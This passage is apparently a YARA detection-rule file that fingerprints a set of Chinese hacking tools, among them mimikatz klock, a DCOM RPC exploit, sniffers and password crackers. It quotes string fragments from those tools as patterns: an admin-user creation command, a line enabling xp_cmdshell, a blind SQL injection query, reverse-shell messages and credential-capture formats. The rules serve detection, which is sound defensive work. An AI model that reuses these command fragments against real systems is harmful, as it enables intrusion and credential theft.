      description = "Chinese Hacktool Set - file IdtTool.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 12:43:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "IdtTool.sys" fullword ascii
      $s4 = "Idt Tool bY tMd[CsP]" fullword wide
      $s6 = "\\\\.\\slIdtTool" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 25KB and all of them
} 

rule GoodToolset_ms11046_RID2DBF : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file ms11046.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:45:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[*] Token system command" fullword ascii
      $s2 = "[*] command add user 90sec 90sec" fullword ascii
      $s3 = "[*] Add to Administrators success" fullword ascii
      $s4 = "[*] User has been successfully added" fullword ascii
      $s5 = "Program: %s%s%s%s%s%s%s%s%s%s%s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 840KB and 2 of them
} 

rule Sniffer_analyzer_SSClone_1210_full_version_RID3733 : DEMO EXE FILE HKTL T1040 T1136 {
   meta:
      description = "Chinese Hacktool Set - file Sniffer analyzer SSClone 1210 full version.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 17:28:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1040, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "http://www.vip80000.com/hot/index.html" fullword ascii
      $s1 = "GetConnectString" fullword ascii
      $s2 = "CnCerT.Safe.SSClone.dll" fullword ascii
      $s3 = "(*.JPG;*.BMP;*.GIF;*.ICO;*.CUR)|*.JPG;*.BMP;*.GIF;*.ICO;*.CUR|JPG" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3580KB and all of them
} 

rule x64_klock_RID2A66 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file klock.dll"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 05:41:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Bienvenue dans un processus distant" fullword wide
      $s2 = "klock.dll" fullword ascii
      $s3 = "Erreur : le bureau courant (" fullword wide
      $s4 = "klock de mimikatz pour Windows" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 907KB and all of them
} 

rule MarathonTool_2_RID2C7A : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file MarathonTool.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:50:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "http://localhost/retomysql/pista.aspx?id_pista=1" fullword wide
      $s6 = "SELECT ASCII(SUBSTR(username,{0},1)) FROM USER_USERS" fullword wide
      $s17 = "/Blind SQL injection tool based in heavy queries" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them
} 

rule scanms_scanms_RID2C7A : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file scanms.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:50:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "--- ScanMs Tool --- (c) 2003 Internet Security Systems ---" fullword ascii
      $s2 = "Scans for systems vulnerable to MS03-026 vuln" fullword ascii
      $s3 = "More accurate for WinXP/Win2k, less accurate for WinNT" fullword ascii
      $s4 = "added %d.%d.%d.%d-%d.%d.%d.%d" fullword ascii
      $s5 = "Internet Explorer 1.0" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 3 of them
} 

rule CN_Tools_PcShare_RID2D17 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file PcShare.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:17:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "title=%s%s-%s;id=%s;hwnd=%d;mainhwnd=%d;mainprocess=%d;cmd=%d;" fullword wide
      $s1 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)" fullword wide
      $s2 = "http://www.pcshares.cn/pcshare200/lostpass.asp" fullword wide
      $s5 = "port=%s;name=%s;pass=%s;" fullword wide
      $s16 = "%s\\ini\\*.dat" fullword wide
      $s17 = "pcinit.exe" fullword wide
      $s18 = "http://www.pcshare.cn" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and 3 of them
} 

rule pw_inspector_RID2C2E : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file pw-inspector.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:38:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "-m MINLEN  minimum length of a valid password" fullword ascii
      $s2 = "http://www.thc.org" fullword ascii
      $s3 = "Use for hacking: trim your dictionary file to the pw requirements of the target." fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 460KB and all of them
} 

rule Dll_LoadEx_RID2AC9 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file Dll_LoadEx_RID2AC9.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:26:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "WiNrOOt@126.com" fullword wide
      $s1 = "Dll_LoadEx_RID2AC9.EXE" fullword wide
      $s3 = "You Already Loaded This DLL ! :(" fullword ascii
      $s10 = "Dll_LoadEx_RID2AC9 Microsoft " fullword wide
      $s17 = "Can't Load This Dll ! :(" fullword ascii
      $s18 = "WiNrOOt" fullword wide
      $s20 = " Dll_LoadEx_RID2AC9(&A)..." fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 120KB and 3 of them
} 

rule Dos_iis7_RID2A12 : DEMO EXE FILE HKTL T1033 T1136 {
   meta:
      description = "Chinese Hacktool Set - file iis7.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 03:21:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1033, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\\\localhost" fullword ascii
      $s1 = "iis.run" fullword ascii
      $s3 = ">Could not connecto %s" fullword ascii
      $s5 = "WHOAMI" ascii
      $s13 = "WinSta0\\Default" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 140KB and all of them
} 

rule SQLCracker_RID2ABC : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file SQLCracker_RID2ABC.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:05:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "msvbvm60.dll" fullword ascii
      $s1 = "_CIcos" fullword ascii
      $s2 = "kernel32.dll" fullword ascii
      $s3 = "cKmhV" fullword ascii
      $s4 = "080404B0" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 125KB and all of them
} 

rule FreeVersion_debug_RID2DDF : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file debug.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:50:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "c:\\Documents and Settings\\Administrator\\" fullword ascii
      $s1 = "Got WMI process Pid: %d" ascii
      $s2 = "This exploit will execute" ascii
      $s6 = "Found token %s " ascii
      $s7 = "Running reverse shell" ascii
      $s10 = "wmiprvse.exe" fullword ascii
      $s12 = "SELECT * FROM IIsWebInfo" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 820KB and 3 of them
} 

rule Dos_look_RID2A4B : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file look.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 04:56:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<description>CHKen QQ:41901298</description>" fullword ascii
      $s2 = "version=\"9.9.9.9\"" fullword ascii
      $s3 = "name=\"CH.Ken.Tool\"" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 40KB and all of them
} 

rule NtGodMode_RID2A72 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file NtGodMode_RID2A72.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 06:01:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "to HOST!" fullword ascii
      $s1 = "SS.EXE" fullword ascii
      $s5 = "lstrlen0" fullword ascii
      $s6 = "Virtual" fullword ascii
      $s19 = "RtlUnw" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 45KB and all of them
} 

rule WebCrack4_RouterPasswordCracking_RID339C : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file WebCrack4-RouterPasswordCracking.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 14:55:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "http://www.site.com/test.dll?user=%USERNAME&pass=%PASSWORD" fullword ascii
      $s1 = "Username: \"%s\", Password: \"%s\", Remarks: \"%s\"" fullword ascii
      $s14 = "user:\"%s\" pass: \"%s\" result=\"%s\"" fullword ascii
      $s16 = "Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)" fullword ascii
      $s20 = "List count out of bounds (%d)+Operation not allowed on sorted string list%String" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and 2 of them
} 

rule S_MultiFunction_Scanners_s_RID3182 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file s.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:25:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "C:\\WINDOWS\\temp\\pojie.exe /l=" fullword ascii
      $s1 = "C:\\WINDOWS\\temp\\s.exe" fullword ascii
      $s2 = "C:\\WINDOWS\\temp\\s.exe tcp " fullword ascii
      $s3 = "explorer.exe http://www.hackdos.com" fullword ascii
      $s4 = "C:\\WINDOWS\\temp\\pojie.exe" fullword ascii
      $s5 = "Failed to read file or invalid data in file!" fullword ascii
      $s6 = "www.hackdos.com" fullword ascii
      $s7 = "WTNE / MADE BY E COMPILER - WUTAO " fullword ascii
      $s11 = "The interface of kernel library is invalid!" fullword ascii
      $s12 = "eventvwr" fullword ascii
      $s13 = "Failed to decompress data!" fullword ascii
      $s14 = "NOTEPAD.EXE result.txt" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and 4 of them
} 

rule Dos_GetPass_RID2B4D : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file GetPass.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:00:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "GetLogonS" ascii
      $s3 = "/showthread.php?t=156643" ascii
      $s8 = "To Run As Administ" ascii
      $s18 = "EnableDebugPrivileg" fullword ascii
      $s19 = "sedebugnameValue" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 890KB and all of them
} 

rule update_PcMain_RID2C2B : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file PcMain.dll"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:37:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; .NET CLR 1.1.4322" ascii
      $s1 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost" fullword ascii
      $s2 = "SOFTWARE\\Classes\\HTTP\\shell\\open\\command" fullword ascii
      $s3 = "\\svchost.exe -k " fullword ascii
      $s4 = "SYSTEM\\ControlSet001\\Services\\%s" fullword ascii
      $s9 = "Global\\%s-key-event" fullword ascii
      $s10 = "%d%d.exe" fullword ascii
      $s14 = "%d.exe" fullword ascii
      $s15 = "Global\\%s-key-metux" fullword ascii
      $s18 = "GET / HTTP/1.1" fullword ascii
      $s19 = "\\Services\\" fullword ascii
      $s20 = "qy001id=%d;qy001guid=%s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 4 of them
} 

rule Dos_sys_RID29F5 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file sys.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 02:33:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "'SeDebugPrivilegeOpen " fullword ascii
      $s6 = "Author: Cyg07*2" fullword ascii
      $s12 = "from golds7n[LAG]'J" fullword ascii
      $s14 = "DAMAGE" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and all of them
} 

rule Project1_RID2A19 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file Project1_RID2A19.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 03:33:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "EXEC master.dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll'" fullword ascii
      $s2 = "Password.txt" fullword ascii
      $s3 = "LoginPrompt" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and all of them
} 

rule CN_Tools_MyUPnP_RID2C9A : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file MyUPnP.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:56:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<description>BYTELINKER.COM</description>" fullword ascii
      $s2 = "myupnp.exe" fullword ascii
      $s3 = "LOADER ERROR" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1500KB and all of them
} 

rule CN_Tools_Shiell_RID2CD2 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file Shiell.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:05:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\Users\\Tong\\Documents\\Visual Studio 2012\\Projects\\Shift shell" ascii
      $s2 = "C:\\Windows\\System32\\Shiell.exe" fullword wide
      $s3 = "Shift shell.exe" fullword wide
      $s4 = "\" /v debugger /t REG_SZ /d \"" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1500KB and 2 of them
} 

rule cndcom_cndcom_RID2C58 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file cndcom.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:45:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "- Rewritten by HDM last <hdm [at] metasploit.com>" fullword ascii
      $s2 = "- Usage: %s <Target ID> <Target IP>" fullword ascii
      $s3 = "- Remote DCOM RPC Buffer Overflow Exploit" fullword ascii
      $s4 = "- Warning:This Code is more like a dos tool!(Modify by pingker)" fullword ascii
      $s5 = "Windows NT SP6 (Chinese)" fullword ascii
      $s6 = "- Original code by FlashSky and Benjurry" fullword ascii
      $s7 = "\\C$\\123456111111111111111.doc" fullword wide
      $s8 = "shell3all.c" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 2 of them
} 

rule IsDebug_V1_4_RID2B2D : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file IsDebug V1.4.dll"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:55:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "IsDebug.dll" fullword ascii
      $s1 = "SV Dumper V1.0" fullword wide
      $s2 = "(IsDebuggerPresent byte Patcher)" fullword ascii
      $s8 = "Error WriteMemory failed" fullword ascii
      $s9 = "IsDebugPresent" fullword ascii
      $s10 = "idb_Autoload" fullword ascii
      $s11 = "Bin Files" fullword ascii
      $s12 = "MASM32 version" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them
} 

rule HScan_v1_20_PipeCmd_and_xCmd_RID3123 : DEMO EXE FILE HKTL T1035 T1077 T1136 {
   meta:
      description = "Chinese Hacktool Set - file PipeCmd.exe / xCmd.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 13:09:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1035, T1077, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "%SystemRoot%\\system32\\PipeCmdSrv.exe" fullword ascii
      $s2 = "PipeCmd.exe" fullword wide
      $s3 = "Please Use NTCmd.exe Run This Program." fullword ascii
      $s4 = "%s\\pipe\\%s%s%d" fullword ascii
      $s5 = "\\\\.\\pipe\\%s%s%d" fullword ascii
      $s6 = "%s\\ADMIN$\\System32\\%s%s" fullword ascii
      $s7 = "This is a service executable! Couldn't start directly." fullword ascii
      $s8 = "Connecting to Remote Server ...Failed" fullword ascii
      $s9 = "PIPECMDSRV" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 4 of them
} 

rule Dos_fp_RID296C : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file fp.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 22:45:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "fpipe -l 53 -s 53 -r 80 192.168.1.101" fullword ascii
      $s2 = "FPipe.exe" fullword wide
      $s3 = "http://www.foundstone.com" fullword ascii
      $s4 = "%s %s port %d. Address is already in use" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 65KB and all of them
} 

rule CN_Tools_xsniff_RID2CFF : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file xsniff.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 10:13:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "xsiff.exe -pass -hide -log pass.log" fullword ascii
      $s1 = "HOST: %s USER: %s, PASS: %s" fullword ascii
      $s2 = "xsiff.exe -tcp -udp -asc -addr 192.168.1.1" fullword ascii
      $s10 = "Code by glacier <glacier@xfocus.org>" fullword ascii
      $s11 = "%-5s%s->%s Bytes=%d TTL=%d Type: %d,%d ID=%d SEQ=%d" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 220KB and 2 of them
} 

rule MSSqlPass_RID2A78 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file MSSqlPass_RID2A78.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 06:11:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Reveals the passwords stored in the Registry by Enterprise Manager of SQL Server" wide
      $s1 = "empv.exe" fullword wide
      $s2 = "Enterprise Manager PassView" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 120KB and all of them
} 

rule WSockExpert_RID2B70 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file WSockExpert_RID2B70.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:06:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "OpenProcessCmdExecute!" fullword ascii
      $s2 = "http://www.hackp.com" fullword ascii
      $s3 = "'%s' is not a valid time!'%s' is not a valid date and time" fullword wide
      $s4 = "SaveSelectedFilterCmdExecute" fullword ascii
      $s5 = "PasswordChar@" fullword ascii
      $s6 = "WSockHook.DLL" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2500KB and 4 of them
} 

rule Ms_Viru_racle_RID2C3C : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file racle.dll"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:40:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "PsInitialSystemProcess @%p" fullword ascii
      $s1 = "PsLookupProcessByProcessId(%u) Failed" fullword ascii
      $s2 = "PsLookupProcessByProcessId(%u) => %p" fullword ascii
      $s3 = "FirstStage() Loaded, CurrentThread @%p Stack %p - %p" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 210KB and all of them
} 

rule lamescan3_RID2A88 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file lamescan3_RID2A88.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 06:38:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "dic\\loginlist.txt" fullword ascii
      $s2 = "Radmin.exe" fullword ascii
      $s3 = "lamescan3_RID2A88.pdf!" fullword ascii
      $s4 = "dic\\passlist.txt" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3740KB and all of them
} 

rule CN_Tools_pc_RID2B44 : CHINA DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file pc.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 08:59:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\\svchost.exe" fullword ascii
      $s2 = "%s%08x.001" fullword ascii
      $s3 = "Qy001Service" fullword ascii
      $s4 = "/.MIKY" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and all of them
} 

rule Dos_Down64_RID2A98 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file Down64.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 07:05:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\Windows\\Temp\\Down.txt" fullword wide
      $s2 = "C:\\Windows\\Temp\\Cmd.txt" fullword wide
      $s3 = "C:\\Windows\\Temp\\" fullword wide
      $s4 = "ProcessXElement" fullword ascii
      $s8 = "down.exe" fullword wide
      $s20 = "set_Timer1" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and all of them
} 

rule epathobj_exp32_RID2C6F : DEMO EXE FILE HKTL T1068 T1136 {
   meta:
      description = "Chinese Hacktool Set - file epathobj_exp32_RID2C6F.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:49:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1068, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Watchdog thread %d waiting on Mutex" fullword ascii
      $s1 = "Exploit ok run command" fullword ascii
      $s2 = "\\epathobj_exp\\Release\\epathobj_exp.pdb" fullword ascii
      $s3 = "Alllocated userspace PATHRECORD () %p" fullword ascii
      $s4 = "Mutex object did not timeout, list not patched" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 270KB and all of them
} 

rule Tools_unknown_RID2C91 : DEMO EXE FILE HKTL T1136 {
   meta:
      description = "Chinese Hacktool Set - file unknown.exe"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:54:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "No data to read.$Can not bind in port range (%d - %d)" fullword wide
      $s2 = "GET /ok.asp?id=1__sql__ HTTP/1.1" fullword ascii
      $s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii
      $s4 = "Failed to clear tab control Failed to delete tab at index %d\"Failed to retrieve" wide
      $s5 = "Host: 127.0.0.1" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2500KB and 4 of them
} 

